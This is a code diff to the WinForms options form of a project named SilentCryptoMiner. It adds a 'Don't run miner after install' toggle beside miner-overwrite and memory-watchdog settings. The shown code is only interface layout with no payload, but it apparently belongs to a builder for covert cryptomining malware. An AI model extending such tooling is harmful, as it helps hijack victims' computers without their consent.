@@ -39,6 +39,8 @@ namespace SilentCryptoMiner
         {
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AdvancedOptions));
             this.formAdvancedOptions = new MephTheme();
+            this.labelAdvancedOptionNoRunInstall = new System.Windows.Forms.Label();
+            this.toggleNoRunInstall = new MephToggleSwitch();
             this.labelAdvancedOptionMinerOverwrite = new System.Windows.Forms.Label();
             this.toggleMinerOverwrite = new MephToggleSwitch();
             this.labelAdvancedOptionMemoryWatchdog = new System.Windows.Forms.Label();
@@ -57,6 +59,8 @@ namespace SilentCryptoMiner
             this.formAdvancedOptions.AccentColor = System.Drawing.Color.DarkRed;
             this.formAdvancedOptions.Anchor = System.Windows.Forms.AnchorStyles.None;
             this.formAdvancedOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
+            this.formAdvancedOptions.Controls.Add(this.labelAdvancedOptionNoRunInstall);
+            this.formAdvancedOptions.Controls.Add(this.toggleNoRunInstall);
             this.formAdvancedOptions.Controls.Add(this.labelAdvancedOptionMinerOverwrite);
             this.formAdvancedOptions.Controls.Add(this.toggleMinerOverwrite);
             this.formAdvancedOptions.Controls.Add(this.labelAdvancedOptionMemoryWatchdog);
@@ -73,6 +77,30 @@ namespace SilentCryptoMiner
             this.formAdvancedOptions.SubHeader = "";
             this.formAdvancedOptions.TabIndex = 0;
             this.formAdvancedOptions.Text = "Advanced Options";
+            // 
+            // labelAdvancedOptionNoRunInstall
+            // 
+            this.labelAdvancedOptionNoRunInstall.AutoSize = true;
+            this.labelAdvancedOptionNoRunInstall.BackColor = System.Drawing.Color.Transparent;
+            this.labelAdvancedOptionNoRunInstall.Font = new System.Drawing.Font("Segoe UI", 9.5F);
+            this.labelAdvancedOptionNoRunInstall.ForeColor = System.Drawing.Color.Gray;
+            this.labelAdvancedOptionNoRunInstall.Location = new System.Drawing.Point(13, 127);
+            this.labelAdvancedOptionNoRunInstall.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.labelAdvancedOptionNoRunInstall.Name = "labelAdvancedOptionNoRunInstall";
+            this.labelAdvancedOptionNoRunInstall.Size = new System.Drawing.Size(170, 17);
+            this.labelAdvancedOptionNoRunInstall.TabIndex = 118;
+            this.labelAdvancedOptionNoRunInstall.Text = "Don\'t run miner after install:";
+            // 
+            // toggleNoRunInstall
+            // 
+            this.toggleNoRunInstall.BackColor = System.Drawing.Color.Transparent;
+            this.toggleNoRunInstall.Checked = false;
+            this.toggleNoRunInstall.ForeColor = System.Drawing.Color.Black;
+            this.toggleNoRunInstall.Location = new System.Drawing.Point(188, 124);
+            this.toggleNoRunInstall.Margin = new System.Windows.Forms.Padding(2);
+            this.toggleNoRunInstall.Name = "toggleNoRunInstall";
+            this.toggleNoRunInstall.Size = new System.Drawing.Size(50, 24);
+            this.toggleNoRunInstall.TabIndex = 117;
             // 
             // labelAdvancedOptionMinerOverwrite
             // 
@@ -215,5 +243,7 @@ namespace SilentCryptoMiner
         internal MephToggleSwitch toggleMemoryWatchdog;
         internal Label labelAdvancedOptionMinerOverwrite;
         internal MephToggleSwitch toggleMinerOverwrite;
+        internal Label labelAdvancedOptionNoRunInstall;
+        internal MephToggleSwitch toggleNoRunInstall;
     }
 }
